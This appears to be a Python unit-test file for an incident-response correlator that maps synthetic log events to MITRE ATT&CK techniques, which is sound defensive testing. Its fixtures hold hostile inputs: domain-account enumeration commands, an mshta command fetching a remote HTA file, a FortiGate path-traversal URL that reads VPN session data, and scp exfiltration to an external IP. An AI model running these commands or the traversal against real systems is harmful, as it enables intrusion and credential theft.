import unittest
from bluekit.ir.correlator import correlate_incident
from bluekit.kb.query import KB

class TestIRGaps2Corr(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.kb = KB()

    def test_net_group_domain_admins(self):
        events = [{'cmd': 'net group "domain admins" /domain', 'host': 'host1', 'user': 'user1'}]
        chain = correlate_incident(events, kb=self.kb, heuristic_fallback=False)
        t1087 = [s for s in chain.stages if s.technique_id == 'T1087.002']
        t1069 = [s for s in chain.stages if s.technique_id == 'T1069.002']
        self.assertEqual(len(t1087), 1)
        self.assertEqual(len(t1069), 1)

    def test_net_user_domain_only(self):
        events = [{'cmd': 'net user /domain', 'host': 'host1', 'user': 'user1'}]
        chain = correlate_incident(events, kb=self.kb, heuristic_fallback=False)
        t1087 = [s for s in chain.stages if s.technique_id == 'T1087.002']
        t1069 = [s for s in chain.stages if s.technique_id == 'T1069.002']
        self.assertEqual(len(t1087), 1)
        self.assertEqual(len(t1069), 0)

    def test_scp_external_no_cmd(self):
        events = [{'process': 'scp', 'cmd': '', 'dst_ip': '194.169.175.35', 'message': 'outbound 1.2GB', 'host': 'host1'}]
        chain = correlate_incident(events, kb=self.kb, heuristic_fallback=False)
        t1048 = [s for s in chain.stages if s.technique_id == 'T1048']
        self.assertEqual(len(t1048), 1)
        self.assertEqual(t1048[0].iocs.get('size'), '1.2GB')

    def test_scp_internal_ignored(self):
        events = [{'process': 'scp', 'cmd': '', 'dst_ip': '10.0.0.9', 'message': 'outbound 1.2GB', 'host': 'host1'}]
        chain = correlate_incident(events, kb=self.kb, heuristic_fallback=False)
        t1048 = [s for s in chain.stages if s.technique_id == 'T1048']
        self.assertEqual(len(t1048), 0)

    def test_browser_spawns_mshta_url(self):
        events = [{'parent_process': 'chrome.exe', 'process': 'mshta.exe', 'cmd': 'mshta https://45.153.160.140/inv.hta', 'host': 'host1'}]
        chain = correlate_incident(events, kb=self.kb, heuristic_fallback=False)
        t1566 = [s for s in chain.stages if s.technique_id == 'T1566.002']
        t1218 = [s for s in chain.stages if s.technique_id == 'T1218.005']
        self.assertEqual(len(t1566), 1)
        self.assertEqual(len(t1218), 1)

    def test_browser_spawns_powershell_no_url(self):
        events = [{'parent_process': 'msedge.exe', 'process': 'powershell.exe', 'cmd': 'powershell -nop', 'host': 'host1'}]
        chain = correlate_incident(events, kb=self.kb, heuristic_fallback=False)
        t1566 = [s for s in chain.stages if s.technique_id == 'T1566.002']
        self.assertEqual(len(t1566), 0)

    def test_vpn_login_after_exploit(self):
        events = [
            {'dataset': 'nginx', 'url': '/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession', 'src_ip': '194.169.175.35', 'host': 'FGT-01', 'status_code': 200},
            {'channel': 'fortigate-vpn', 'message': 'sslvpn session established', 'src_ip': '194.169.175.35', 'host': 'FGT-01'}
        ]
        chain = correlate_incident(events, kb=self.kb, heuristic_fallback=False)
        t1133 = [s for s in chain.stages if s.technique_id == 'T1133']
        t1078 = [s for s in chain.stages if s.technique_id == 'T1078']
        self.assertEqual(len(t1133), 1)
        self.assertGreaterEqual(len(t1078), 1)

    def test_vpn_login_normal_user(self):
        events = [{'channel': 'fortigate-vpn', 'message': 'sslvpn login user a.k MFA ok', 'src_ip': '213.230.90.11', 'host': 'FGT-01'}]
        chain = correlate_incident(events, kb=self.kb, heuristic_fallback=False)
        t1133 = [s for s in chain.stages if s.technique_id == 'T1133']
        self.assertEqual(len(t1133), 0)

    def test_send_from_compromised(self):
        events = [
            {'Operation': 'New-InboxRule', 'cmd': 'forward', 'user': 'cfo@x.test', 'host': 'host1'},
            {'Operation': 'Send', 'user': 'cfo@x.test', 'host': 'host1'},
            {'Operation': 'Send', 'user': 'other@x.test', 'host': 'host1'}
        ]
        chain = correlate_incident(events, kb=self.kb, heuristic_fallback=False)
        t1534 = [s for s in chain.stages if s.technique_id == 'T1534']
        self.assertEqual(len(t1534), 1)

if __name__ == '__main__':
    unittest.main()
